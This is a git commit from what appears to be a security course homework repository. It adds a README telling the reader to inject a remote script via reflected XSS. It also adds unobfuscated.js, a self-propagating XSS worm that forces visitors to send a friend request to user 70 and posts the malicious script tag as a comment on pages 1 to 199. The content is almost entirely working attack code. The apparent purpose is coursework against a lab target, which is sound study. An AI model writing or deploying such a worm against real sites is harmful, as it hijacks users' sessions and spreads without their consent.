c2fb85e8b6f4842de41cf650f71382e530f85734
Alex Collom <ajc9076@rit.edu>
2022-04-04 13:58:47 -0400

    added the unobfuscated code and the actual XSS code

---
+++ README.md
@@ -0,0 +1,3 @@
+Use reflected XSS to insert the following statement:
+
+<script src="https://github.com/ajc9076/csec380-hw6/blob/main/malware.js"></script>
---
+++ unobfuscated.js
@@ -0,0 +1,14 @@
+const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
+if(cookies.get("xssed") != "yes"){
+	var xhx = new XMLHttpRequest();
+	xhx.open("GET", `/add_friend.php?id=70`,true);
+	xhx.send();
+	for(var i = 1; i < 200; i++){
+		var id = i;
+		var payload = encodeURIComponent("<script src=\"/js/malware.js\"></script>");
+		var xhy = new XMLHttpRequest();
+		xhy.open("GET", `/add_comment.php?id=${id}&comment=${payload}`,true);
+		xhy.send();
+	};
+}
+document.cookie = "xssed=yes"
